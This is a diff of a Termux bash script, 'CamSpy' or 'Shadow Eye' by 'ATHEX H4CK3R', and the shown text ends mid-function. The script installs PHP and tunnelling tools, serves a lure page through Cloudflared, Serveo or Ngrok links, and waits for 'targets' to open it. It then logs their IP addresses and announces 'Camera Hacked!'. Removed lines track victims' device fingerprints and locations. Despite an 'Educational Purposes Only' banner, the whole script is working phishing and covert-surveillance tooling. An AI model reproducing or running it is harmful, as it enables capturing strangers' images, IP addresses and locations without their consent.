@@ -1,448 +1,446 @@
 #!/bin/bash
-# SHADOW EYE
-# Created by: ATHEX H4CK3R 🔥
-# Version: 2.0
+# coded by: ATHEX H4CK3R 🔥
+clear
 
-declare -A COLORS
-COLORS=(
-    ["BLACK"]="\e[0;30m"
-    ["RED"]="\e[0;91m"
-    ["GREEN"]="\e[0;92m"
-    ["YELLOW"]="\e[0;93m"
-    ["BLUE"]="\e[0;94m"
-    ["MAGENTA"]="\e[0;95m"
-    ["CYAN"]="\e[0;96m"
-    ["WHITE"]="\e[0;97m"
-    ["ORANGE"]="\e[38;5;214m"
-    ["PURPLE"]="\e[38;5;129m"
-    ["PINK"]="\e[38;5;206m"
-    ["RESET"]="\e[0m"
-    ["BOLD"]="\e[1m"
-    ["DIM"]="\e[2m"
-    ["BLINK"]="\e[5m"
-)
+# Install dependencies
+termux-setup-storage
+pkg install php -y
+pkg install wget -y
+pkg install cloudflared -y  # Added Cloudflared installation
+clear
 
-ICON_CHECK="✅"
-ICON_ERROR="❌"
-ICON_WARN="⚠️"
-ICON_INFO="ℹ️"
-ICON_LINK="🔗"
-ICON_CAMERA="📸"
-ICON_LOCATION="📍"
-ICON_DEVICE="💻"
-ICON_NETWORK="🌐"
-ICON_CLOCK="⏱️"
-ICON_STOP="⏹️"
-ICON_START="▶️"
-ICON_DOWNLOAD="📥"
-ICON_UPLOAD="📤"
-ICON_SETTINGS="⚙️"
-ICON_MENU="📋"
-ICON_SUCCESS="🎉"
+trap 'printf "\n";stop' 2
 
-SCRIPT_VERSION="2.0"
-SCRIPT_NAME="CAMSPY PRO"
-LOG_FILE="camspy_$(date +%Y%m%d).log"
-CONFIG_FILE=".camspy_config"
-TUNNEL_PID=""
-PHP_PID=""
-
-trap 'cleanup_and_exit' SIGINT SIGTERM EXIT
-
-log_message() {
-    local level=$1
-    local message=$2
-    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
-    echo -e "[$timestamp] [$level] $message" >> "$LOG_FILE"
-}
-
-show_spinner() {
-    local pid=$1
-    local message=$2
-    local spinstr='⣾⣽⣻⢿⡿⣟⣯⣷'
-    local delay=0.1
+# Animation functions
+animate_banner() {
+    echo -e "\033[?25l"  # Hide cursor
+    local colors=("\e[1;91m" "\e[1;93m" "\e[1;92m" "\e[1;96m" "\e[1;94m" "\e[1;95m")
+    local frame=0
     
-    printf "${COLORS[CYAN]}    ⏳ $message ${COLORS[RESET]}"
-    
-    while ps -p $pid > /dev/null 2>&1; do
-        local temp=${spinstr#?}
-        printf "${COLORS[YELLOW]}[%c]${COLORS[RESET]}" "$spinstr"
-        local spinstr=$temp${spinstr%"$temp"}
-        sleep $delay
-        printf "\b\b\b"
+    while [ $frame -lt 15 ]; do
+        clear
+        color=${colors[$((RANDOM % ${#colors[@]}))]}
+        
+        printf "\n\n"
+        printf "    ${color}╔══════════════════════════════════════════════════════════╗\e[0m\n"
+        printf "    ${color}║                                                          ║\e[0m\n"
+        printf "    ${color}║      ██████╗ █████╗ ███╗   ███╗███████╗██████╗ ██╗   ██╗ ║\e[0m\n"
+        printf "    ${color}║     ██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗╚██╗ ██╔╝ ║\e[0m\n"
+        printf "    ${color}║     ██║     ███████║██╔████╔██║███████╗██████╔╝ ╚████╔╝  ║\e[0m\n"
+        printf "    ${color}║     ██║     ██╔══██║██║╚██╔╝██║╚════██║██╔═══╝   ╚██╔╝   ║\e[0m\n"
+        printf "    ${color}║     ╚██████╗██║  ██║██║ ╚═╝ ██║███████║██║        ██║    ║\e[0m\n"
+        printf "    ${color}║      ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝        ╚═╝    ║\e[0m\n"
+        printf "    ${color}║                                                          ║\e[0m\n"
+        printf "    ${color}╚══════════════════════════════════════════════════════════╝\e[0m\n"
+        
+        sleep 0.1
+        ((frame++))
     done
-    printf "${COLORS[GREEN]}✓${COLORS[RESET]}   \n"
+    echo -e "\033[?25h"  # Show cursor
 }
 
-show_banner() {
+banner() {
     clear
+    printf "\e[0m\n\n"
     
-    local colors=(${COLORS[RED]} ${COLORS[ORANGE]} ${COLORS[YELLOW]} ${COLORS[GREEN]} ${COLORS[CYAN]} ${COLORS[BLUE]} ${COLORS[MAGENTA]} ${COLORS[PINK]})
-    
-    echo -e "${COLORS[BOLD]}"
+    # Animated gradient banner
+    local colors=("\e[1;91m" "\e[1;93m" "\e[1;92m" "\e[1;96m" "\e[1;94m" "\e[1;95m")
+    local main_color=${colors[$((RANDOM % ${#colors[@]}))]}
+
+    printf " \e[1;97m \e[1;96m \e[1;95m ██████╗ █████╗ ███╗   ███╗███████╗██████╗ ██╗   ██╗  \e[1;96m \e[0m \n"
+    printf " \e[1;97m \e[1;96m \e[1;95m██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗╚██╗ ██╔╝  \e[1;96m \e[0m \n"
+    printf " \e[1;97m \e[1;96m \e[1;95m██║     ███████║██╔████╔██║███████╗██████╔╝ ╚████╔╝   \e[1;96m \e[0m \n"
+    printf " \e[1;97m \e[1;96m \e[1;95m██║     ██╔══██║██║╚██╔╝██║╚════██║██╔═══╝   ╚██╔╝    \e[1;96m \e[0m \n"
+    printf " \e[1;97m \e[1;96m \e[1;95m╚██████╗██║  ██║██║ ╚═╝ ██║███████║██║        ██║     \e[1;96m \e[0m \n"
+    printf " \e[1;97m \e[1;96m \e[1;95m ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝        ╚═╝     \e[1;96m \e[0m \n"
+    printf " \e[1;97m \e[1;92m✰✰✰ Created By: \e[1;91mA T H E X \e[1;96mH4CK3R\e[1;92m✰✰✰\e[0m  \n"
+    printf " \e[1;97m \e[1;93m↬ Contact: \e[1;97mWhatsApp: \e[1;92m+92 3490916663                     \e[0m\n"
+    printf " \e[1;97m .................................................................................\e[0m\n"
+    printf " \e[1;97m     \e[1;96m⚠ \e[1;97mPlease use forwarding option if Link not generated\e[0m        \n"
+    printf " \e[1;97m     \e[1;93m⚠ \e[1;97mFor Educational Purposes Only!\e[0m                            \n"
+    printf " \e[1;97m ................................................................................\e[0m\n"
     
     printf "\n"
-    for line in \
-    "███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗         ███████╗██╗   ██╗███████╗ "\
-    "██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║         ██╔════╝╚██╗ ██╔╝██╔════╝ "\
-   " ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║         █████╗   ╚████╔╝ █████╗   "\
-    "╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║         ██╔══╝    ╚██╔╝  ██╔══╝   "\
-    "███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝         ███████╗   ██║   ███████╗ "\
-    "╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝          ╚══════╝   ╚═╝   ╚══════╝ "; do
-                                                           
-        local color=${colors[$((RANDOM % ${#colors[@]}))]}
-        printf "    ${color}%s${COLORS[RESET]}\n" "$line"
+}
+
+# Animated loading function
+loading() {
+    echo -e "\n    \e[1;97m[\e[1;96m•\e[1;97m] \e[1;93m$1 \e[0m"
+    local pid=$!
+    local spin='⣾⣽⣻⢿⡿⣟⣯⣷'
+    local charwidth=3
+    
+    echo -ne "\e[?25l"  # Hide cursor
+    
+    for i in $(seq 1 10); do
+        local color="\e[1;$((90 + (i % 7)))m"
+        printf "\r    \e[1;97m[\e[1;96m%s\e[1;97m] \e[1;93m%s \e[0m%s" "${spin:$((i % ${#spin})):1}" "$1" "$(printf '▓%.0s' $(seq 1 $i))"
         sleep 0.1
     done
     
-    printf "\n"
-    
-    # Stylish info box
-    echo -e "${COLORS[CYAN]}    ...........................................................................${COLORS[RESET]}"
-    echo -e "${COLORS[CYAN]}    ${COLORS[WHITE]}          ✰✰✰ ${COLORS[YELLOW]}CREATED BY: ATHEX H4CK3R${COLORS[WHITE]} ✰✰✰          ${COLORS[CYAN]}${COLORS[RESET]}"
-    echo -e "${COLORS[CYAN]}    ${COLORS[WHITE]}          ${COLORS[GREEN]}Version: ${SCRIPT_VERSION}${COLORS[WHITE]}                         ${COLORS[CYAN]}${COLORS[RESET]}"
-    echo -e "${COLORS[CYAN]}    ${COLORS[WHITE]}          ${COLORS[ORANGE]}${ICON_INFO} Educational Purpose Only ${COLORS[WHITE]}          ${COLORS[CYAN]}${COLORS[RESET]}"
-    echo -e "${COLORS[CYAN]}    ..................................................................................${COLORS[RESET]}"
-    
-    printf "\n"
+    echo -e "\e[?25h"  # Show cursor
+    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92m$1 \e[1;92mCompleted!\e[0m\n"
 }
 
-
-show_progress() {
-    local current=$1
-    local total=$2
-    local message=$3
-    local width=50
-    local percentage=$((current * 100 / total))
-    local filled=$((current * width / total))
-    local empty=$((width - filled))
+stop() {
+    printf "\n\n    \e[1;97m[\e[1;91m!\e[1;97m] \e[1;91mStopping all processes...\e[0m\n"
     
-    printf "\r    ${COLORS[CYAN]}$message ${COLORS[WHITE]}["
-    printf "${COLORS[GREEN]}%${filled}s" | tr ' ' '█'
-    printf "${COLORS[DIM]}%${empty}s" | tr ' ' '░'
-    printf "${COLORS[WHITE]}] ${COLORS[YELLOW]}%d%%${COLORS[RESET]}" $percentage
-}
-
-# Enhanced dependency check
-check_dependencies() {
-    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    📦 Checking Dependencies${COLORS[RESET]}"
-    echo -e "    ${COLORS[DIM]}///////////////////////////////////////////${COLORS[RESET]}"
-    
-    local deps=("php" "wget" "curl" "unzip" "openssh")
-    local missing=()
-    local total=${#deps[@]}
-    local current=0
-    
-    for dep in "${deps[@]}"; do
-        ((current++))
-        show_progress $current $total "Checking dependencies"
-        
-        if command -v $dep > /dev/null 2>&1; then
-            echo -e "\r    ${COLORS[GREEN]}${ICON_CHECK} $dep: Installed${COLORS[RESET]}          "
-        else
-            echo -e "\r    ${COLORS[RED]}${ICON_ERROR} $dep: Missing${COLORS[RESET]}            "
-            missing+=($dep)
-        fi
+    # Animated stopping message
+    for i in {1..3}; do
+        printf "\r    \e[1;91m⏹  Stopping"
+        for j in $(seq 1 $i); do printf "."; done
+        for j in $(seq $i 3); do printf " "; done
+        printf "\e[0m"
         sleep 0.3
     done
     
-    echo -e "    ${COLORS[DIM]}/////////////////////////////////////////////${COLORS[RESET]}"
+    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+    checkphp=$(ps aux | grep -o "php" | head -n1)
+    checkssh=$(ps aux | grep -o "ssh" | head -n1)
+    checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)  # Added Cloudflared check
     
-    # Install missing dependencies
-    if [ ${#missing[@]} -gt 0 ]; then
-        echo -e "\n    ${COLORS[YELLOW]}${ICON_DOWNLOAD} Installing missing packages...${COLORS[RESET]}"
-        for dep in "${missing[@]}"; do
-            echo -ne "    ${COLORS[CYAN]}Installing $dep...${COLORS[RESET]}"
-            if pkg install $dep -y > /dev/null 2>&1; then
-                echo -e " ${COLORS[GREEN]}${ICON_CHECK} Done${COLORS[RESET]}"
-            else
-                echo -e " ${COLORS[RED]}${ICON_ERROR} Failed${COLORS[RESET]}"
-            fi
-        done
+    if [[ $checkngrok == *'ngrok'* ]]; then
+        pkill -f -2 ngrok > /dev/null 2>&1
+        killall -2 ngrok > /dev/null 2>&1
+        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mNgrok stopped\e[0m\n"
+    fi
+
+    if [[ $checkphp == *'php'* ]]; then
+        killall -2 php > /dev/null 2>&1
+        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mPHP server stopped\e[0m\n"
     fi
     
-    # Check for cloudflared separately
-    echo -ne "    ${COLORS[CYAN]}Checking cloudflared...${COLORS[RESET]}"
-    if command -v cloudflared > /dev/null 2>&1; then
-        echo -e " ${COLORS[GREEN]}${ICON_CHECK} Installed${COLORS[RESET]}"
+    if [[ $checkssh == *'ssh'* ]]; then
+        killall -2 ssh > /dev/null 2>&1
+        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mSSH stopped\e[0m\n"
+    fi
+    
+    if [[ $checkcloudflared == *'cloudflared'* ]]; then  # Added Cloudflared termination
+        pkill -f -2 cloudflared > /dev/null 2>&1
+        killall -2 cloudflared > /dev/null 2>&1
+        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloudflared stopped\e[0m\n"
+    fi
+    
+    printf "\n    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mAll processes terminated successfully!\e[0m\n"
+    sleep 1
+    exit 1
+}
+
+dependencies() {
+    printf "\n    \e[1;97m[\e[1;96m*\e[1;97m] \e[1;95mChecking dependencies...\e[0m\n"
+    
+    # Check PHP with animation
+    if command -v php > /dev/null 2>&1; then
+        printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mPHP \e[1;97mis installed\e[0m\n"
     else
-        echo -e " ${COLORS[YELLOW]}${ICON_DOWNLOAD} Installing...${COLORS[RESET]}"
+        printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mPHP is not installed!\e[0m\n"
+        loading "Installing PHP"
+        pkg install php -y > /dev/null 2>&1
+    fi
+    
+    # Check Cloudflared
+    if command -v cloudflared > /dev/null 2>&1; then
+        printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mCloudflared \e[1;97mis installed\e[0m\n"
+    else
+        printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloudflared is not installed!\e[0m\n"
+        loading "Installing Cloudflared"
+        pkg install cloudflared -y > /dev/null 2>&1
+    fi
+}
+
+catch_ip() {
+    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+    IFS=$'\n'
+    
+    printf "\n    \e[1;97m............................................................\e[0m\n"
+    printf "    \e[1;97m      \e[1;92m🎯 TARGET INFORMATION CAPTURED 🎯\e[1;97m       \e[0m\n"
+    printf "    \e[1;97m...............................................................\e[0m\n"
+    printf "    \e[1;97m                                                               \e[0m\n"
+    printf "    \e[1;97m     \e[1;96mIP Address: \e[1;93m%s\e[1;97m                  \e[0m\n" "$ip"
+    printf "    \e[1;97m     \e[1;96mTime: \e[1;93m%s\e[1;97m                        \e[0m\n" "$(date)"
+    printf "    \e[1;97m                                                             \e[0m\n"
+    printf "    \e[1;97m.............................................................\e[0m\n"
+    
+    cat ip.txt >> saved.ip.txt
+}
+
+checkfound() {
+    printf "\n    \e[1;97m[\e[1;96m*\e[1;97m] \e[1;95mWaiting for targets...\e[0m\n"
+    printf "    \e[1;97m[\e[1;93m!\e[1;97m] \e[1;93mPress \e[1;91mCtrl + C \e[1;93mto exit\e[0m\n\n"
+    
+    # Animation while waiting
+    local anim=0
+    local spin='◐◓◑◒'
+    
+    while true; do
+        if [[ -e "ip.txt" ]]; then
+            printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mTarget opened the link!\e[0m\n"
+            echo -e "\a"  # Beep sound
+            catch_ip
+            rm -rf ip.txt
+            
+            # Celebration animation
+            for i in {1..3}; do
+                printf "\r    \e[1;92m🎯 Target Captured! \e[1;93m"
+                for j in $(seq 1 $i); do echo -n "✨"; done
+                sleep 0.3
+            done
+            printf "\e[0m\n"
+        fi
+
+        if [[ -e "Log.log" ]]; then
+            printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mCamera Hacked!\e[0m\n"
+            rm -rf Log.log
+        fi
+        
+        # Spinning animation
+        printf "\r    \e[1;97m[\e[1;96m%s\e[1;97m] \e[1;95mWaiting %s\e[0m" "${spin:$((anim % ${#spin})):1}" "$(printf '.%.0s' $(seq 1 $((anim % 4))))"
+        ((anim++))
+        sleep 0.5
+    done
+}
+
+server() {
+    command -v ssh > /dev/null 2>&1 || { 
+        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mSSH not found! Installing...\e[0m\n"
+        pkg install openssh -y
+    }
+
+    loading "Starting Serveo"
+    
+    # Check if PHP is running and kill it
+    checkphp=$(ps aux | grep -o "php" | head -n1)
+    if [[ $checkphp == *'php'* ]]; then
+        killall -2 php > /dev/null 2>&1
+    fi
+
+    if [[ $subdomain_resp == true ]]; then
+        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net 2> /dev/null > sendlink' &
+        sleep 8
+    else
+        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink' &
+        sleep 8
+    fi
+    
+    loading "Starting PHP server on port 3333"
+    fuser -k 3333/tcp > /dev/null 2>&1
+    php -S localhost:3333 > /dev/null 2>&1 &
+    sleep 3
+    
+    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+    
+    printf "\n    \e[1;97m.........................................................\e[0m\n"
+    printf "    \e[1;97m             \e[1;92m🔗 DIRECT LINK GENERATED 🔗\e[1;97m  \e[0m\n"
+    printf "    \e[1;97m...................................................\e[0m\n"
+    printf "    \e[1;97m                                                    \e[0m\n"
+    printf "    \e[1;97m     \e[1;96m📎 URL: \e[1;93m%s\e[1;97m   \e[0m\n" "$send_link"
+    printf "    \e[1;97m                                                    \e[0m\n"
+    printf "    \e[1;97m.....................................................\e[0m\n"
+}
+
+payload_ngrok() {
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
+    sed 's+forwarding_link+'$link'+g' new-year.html > index.html
+    sed 's+forwarding_link+'$link'+g' template.php > index.php
+}
+
+ngrok_server() {
+    loading "Initializing Ngrok"
+    
+    if [[ -e ngrok ]]; then
+        echo ""
+    else
+        command -v unzip > /dev/null 2>&1 || { 
+            printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mUnzip not found! Installing...\e[0m\n"
+            pkg install unzip -y
+        }
+        
+        command -v wget > /dev/null 2>&1 || { 
+            printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mWget not found! Installing...\e[0m\n"
+            pkg install wget -y
+        }
+        
+        printf "\n    \e[1;97m[\e[1;96m↓\e[1;97m] \e[1;95mDownloading Ngrok...\e[0m\n"
+        
+        # Progress bar for download
+        echo -ne "    \e[1;97m[\e[0m"
+        for i in {1..50}; do
+            echo -ne "\e[1;92m▓"
+            sleep 0.02
+        done
+        echo -ne "\e[1;97m]\e[0m\n"
+        
+        arch=$(uname -a | grep -o 'arm' | head -n1)
+        arch2=$(uname -a | grep -o 'Android' | head -n1)
+        
+        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
+            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+            if [[ -e ngrok-stable-linux-arm.zip ]]; then
+                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+                chmod +x ngrok
+                rm -rf ngrok-stable-linux-arm.zip
+            fi
+        else
+            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
+            if [[ -e ngrok-stable-linux-386.zip ]]; then
+                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+                chmod +x ngrok
+                rm -rf ngrok-stable-linux-386.zip
+            fi
+        fi
+    fi
+
+    loading "Starting PHP server on port 3333"
+    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+    sleep 2
+    
+    loading "Starting Ngrok tunnel"
+    ./ngrok http 3333 > /dev/null 2>&1 &
+    sleep 10
+
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
+    
+    printf "\n    \e[1;97m........................................................\e[0m\n"
+    printf "    \e[1;97m            \e[1;92m🌐 NGROK LINK GENERATED 🌐\e[1;97m\e[0m\n"
+    printf "    \e[1;97m                                                    \e[0m\n"
+    printf "    \e[1;97m             \e[1;96m🔗 URL: \e[1;93m%s\e[1;97m \e[0m\n" "$link"
+    printf "    \e[1;97m                                                    \e[0m\n"
+    printf "    \e[1;97m.....................................................\e[0m\n"
+    
+    payload_ngrok
+    checkfound
+}
+
+# Cloudflared server function (NEW)
+cloudflared_server() {
+    loading "Initializing Cloudflared"
+    
+    # Check if cloudflared is installed
+    if ! command -v cloudflared > /dev/null 2>&1; then
+        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloudflared not found! Installing...\e[0m\n"
+        loading "Installing Cloudflared"
         pkg install cloudflared -y > /dev/null 2>&1
     fi
     
-    log_message "INFO" "Dependencies checked: ${#missing[@]} missing"
-}
-
-# Enhanced menu with styling
-show_main_menu() {
-    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    ${ICON_MENU} SELECT TUNNELING METHOD${COLORS[RESET]}"
-    echo -e "    ${COLORS[DIM]}══════════════════════════════════════${COLORS[RESET]}"
-    
-    local options=(
-        "${COLORS[GREEN]}1.${COLORS[WHITE]} Cloudflared ${COLORS[DIM]}(Recommended - Fastest)"
-        "${COLORS[YELLOW]}2.${COLORS[WHITE]} Serveo.net ${COLORS[DIM]}(Custom Subdomain Support)"
-        "${COLORS[BLUE]}3.${COLORS[WHITE]} Ngrok ${COLORS[DIM]}(Traditional)"
-        "${COLORS[MAGENTA]}4.${COLORS[WHITE]} Localhost Only ${COLORS[DIM]}(No Tunnel)"
-        "${COLORS[RED]}5.${COLORS[WHITE]} Exit"
-    )
-    
-    for opt in "${options[@]}"; do
-        echo -e "    $opt"
-    done
-    
-    echo -e "    ${COLORS[DIM]}══════════════════════════════════════${COLORS[RESET]}"
-    echo -ne "\n    ${COLORS[CYAN]}${ICON_INFO} Choose option [1-5]: ${COLORS[RESET]}"
-}
-
-# Enhanced Cloudflared server function
-start_cloudflared() {
-    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    ☁️ Starting Cloudflared Tunnel${COLORS[RESET]}"
-    echo -e "    ${COLORS[DIM]}──────────────────────────────${COLORS[RESET]}"
-    
-    # Kill existing processes
-    pkill -f cloudflared > /dev/null 2>&1
-    pkill -f php > /dev/null 2>&1
-    
-    # Start PHP server
-    echo -e "    ${COLORS[CYAN]}${ICON_START} Starting PHP server...${COLORS[RESET]}"
+    loading "Starting PHP server on port 3333"
+    fuser -k 3333/tcp > /dev/null 2>&1
     php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-    PHP_PID=$!
     sleep 2
     
-    # Check if PHP started
-    if ps -p $PHP_PID > /dev/null 2>&1; then
-        echo -e "    ${COLORS[GREEN]}${ICON_CHECK} PHP server running on port 3333${COLORS[RESET]}"
-    else
-        echo -e "    ${COLORS[RED]}${ICON_ERROR} Failed to start PHP server${COLORS[RESET]}"
-        return 1
-    fi
+    loading "Starting Cloudflared tunnel on port 3333"
+    # Kill any existing cloudflared processes
+    pkill -f cloudflared > /dev/null 2>&1
     
-    # Start Cloudflared
-    echo -e "    ${COLORS[CYAN]}${ICON_START} Establishing secure tunnel...${COLORS[RESET]}"
+    # Start cloudflared tunnel
     cloudflared tunnel --url http://127.0.0.1:3333 > .cld.log 2>&1 &
-    TUNNEL_PID=$!
+    sleep 10
     
-    # Wait and get URL
-    local timeout=15
-    local counter=0
-    local cldflared_link=""
+    # Try to get the tunnel URL
+    cldflared_link=""
     
-    echo -ne "    ${COLORS[YELLOW]}Waiting for tunnel"
-    while [ -z "$cldflared_link" ] && [ $counter -lt $timeout ]; do
-        sleep 1
-        echo -ne "."
-        cldflared_link=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' .cld.log 2>/dev/null | head -n1)
-        ((counter++))
-    done
-    echo -e "${COLORS[RESET]}"
+    # Method 1: Try to extract from logs
+    if [ -f .cld.log ]; then
+        cldflared_link=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' .cld.log | head -n1)
+    fi
     
-    if [ -n "$cldflared_link" ]; then
-        echo -e "\n    ${COLORS[GREEN]}${ICON_LINK} Tunnel URL: ${COLORS[BOLD]}$cldflared_link${COLORS[RESET]}"
-        
-        # Update payload
-        sed -i "s+forwarding_link+$cldflared_link+g" forwarding_link/index2.html 2>/dev/null
-        
-        # Save to file
-        echo "$cldflared_link" > .last_link
-        
-        # Show QR code
-        echo -e "\n    ${COLORS[CYAN]}📱 QR Code for mobile:${COLORS[RESET]}"
-        curl -s "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=$cldflared_link" > .qr.png 2>/dev/null
-        echo -e "    ${COLORS[GREEN]}QR saved as .qr.png${COLORS[RESET]}"
-        
-        return 0
+    # Method 2: Try curl to local endpoint
+    if [ -z "$cldflared_link" ]; then
+        cldflared_link=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | grep -o "https://[0-9A-Za-z.-]*\.trycloudflare\.com" | head -n1)
+    fi
+    
+    # Method 3: Use timeout and try cloudflared command directly
+    if [ -z "$cldflared_link" ]; then
+        cldflared_link=$(timeout 5 cloudflared tunnel --url http://127.0.0.1:3333 2>&1 | grep -o 'https://[0-9a-z]*\.trycloudflare.com' | head -n1)
+    fi
+    
+    printf "\n    \e[1;97m......................................................\e[0m\n"
+    printf "    \e[1;97m         \e[1;92m☁️ CLOUDFLARED LINK GENERATED ☁️      \e[0m\n"
+    printf "    \e[1;97m         \e[1;96m🔗 URL: \e[1;93m%s\e[1;97m            \e[0m\n" "$cldflared_link"
+    printf "    \e[1;97m........................................................\e[0m\n"
+    
+    # Update payload with cloudflared link
+    sed 's+forwarding_link+'$cldflared_link'+g' new-year.html > index2.html
+    sed 's+forwarding_link+'$cldflared_link'+g' template.php > index.php
+    
+    checkfound
+}
+
+start1() {
+    if [[ -e sendlink ]]; then
+        rm -rf sendlink
+    fi
+
+    printf "\n    \e[1;97m.................................................\e[0m\n"
+    printf "    \e[1;97m   \e[1;92m🎪 CHOOSE PORT FORWARDING METHOD 🎪\e[1;97m\e[0m\n"
+    printf "    \e[1;97m...................................................\e[0m\n"
+    printf "    \e[1;97m   \e[1;96m[01] \e[1;92mCloudflared \e[1;97m(Default & Fast) \e[0m\n"
+    printf "    \e[1;97m   \e[1;96m[02] \e[1;92mServeo.net \e[1;97m(Alternative)     \e[0m\n"
+    printf "    \e[1;97m   \e[1;96m[03] \e[1;92mNgrok \e[1;97m(Alternative Method)    \e[0m\n"
+    printf "    \e[1;97m..............................................................\e[0m\n"
+    
+    default_option_server="1"
+    printf "\n    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;95mChoose option [\e[1;92m1\e[1;95m/\e[1;92m2\e[1;95m/\e[1;92m3\e[1;95m]: \e[0m"
+    read -r option_server
+    option_server="${option_server:-${default_option_server}}"
+    
+    # Animated selection
+    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mSelected option: \e[1;96m%s\e[0m\n" "$option_server"
+    
+    if [[ $option_server -eq 1 ]]; then
+        cloudflared_server
+    elif [[ $option_server -eq 2 ]]; then
+        command -v php > /dev/null 2>&1 || { 
+            printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mPHP not found! Installing...\e[0m\n"
+            pkg install php -y
+        }
+        start
+    elif [[ $option_server -eq 3 ]]; then
+        ngrok_server
     else
-        echo -e "    ${COLORS[RED]}${ICON_ERROR} Failed to establish tunnel${COLORS[RESET]}"
-        return 1
+        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mInvalid option! Using default (Cloudflared)\e[0m\n"
+        sleep 1
+        cloudflared_server
     fi
 }
 
-# Function to monitor victim activity
-monitor_victims() {
-    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    👁️ Monitoring Victim Activity${COLORS[RESET]}"
-    echo -e "    ${COLORS[DIM]}//////////////////////////////////////${COLORS[RESET]}"
-    echo -e "    ${COLORS[YELLOW]}${ICON_INFO} Press Ctrl+C to stop monitoring${COLORS[RESET]}"
-    echo -e "    ${COLORS[DIM]}//////////////////////////////////////${COLORS[RESET]}\n"
-    
-    local last_ip_count=0
-    local last_log_size=0
-    
-    while true; do
-        clear
-        echo -e "${COLORS[BOLD]}${COLORS[CYAN]}    📊 LIVE VICTIM MONITOR${COLORS[RESET]}"
-        echo -e "    ${COLORS[DIM]}══════════════════════════════════════${COLORS[RESET]}\n"
-        
-        # Show current time
-        echo -e "    ${COLORS[WHITE]}${ICON_CLOCK} Last Update: $(date '+%H:%M:%S')${COLORS[RESET]}\n"
-        
-        # Check IP captures
-        if [ -f "ip.txt" ]; then
-            local ip_count=$(wc -l < ip.txt 2>/dev/null || echo 0)
-            if [ $ip_count -gt $last_ip_count ]; then
-                echo -e "    ${COLORS[GREEN]}${ICON_CHECK} New IP captured!${COLORS[RESET]}"
-                last_ip_count=$ip_count
-            fi
-            echo -e "    ${COLORS[CYAN]}📌 Total IPs: $ip_count${COLORS[RESET]}"
-        fi
-        
-        # Check log directory
-        if [ -d "logs" ]; then
-            echo -e "\n    ${COLORS[YELLOW]}📁 Captured Data:${COLORS[RESET]}"
-            
-            # Device info
-            if [ -f "logs/device_info.txt" ]; then
-                local device_count=$(grep -c "=== DEVICE INFO" logs/device_info.txt 2>/dev/null || echo 0)
-                echo -e "    ${COLORS[WHITE]}  ${ICON_DEVICE} Device fingerprints: $device_count${COLORS[RESET]}"
-            fi
-            
-            # Location info
-            if [ -f "logs/location_info.txt" ]; then
-                local location_count=$(grep -c "=== LOCATION INFO" logs/location_info.txt 2>/dev/null || echo 0)
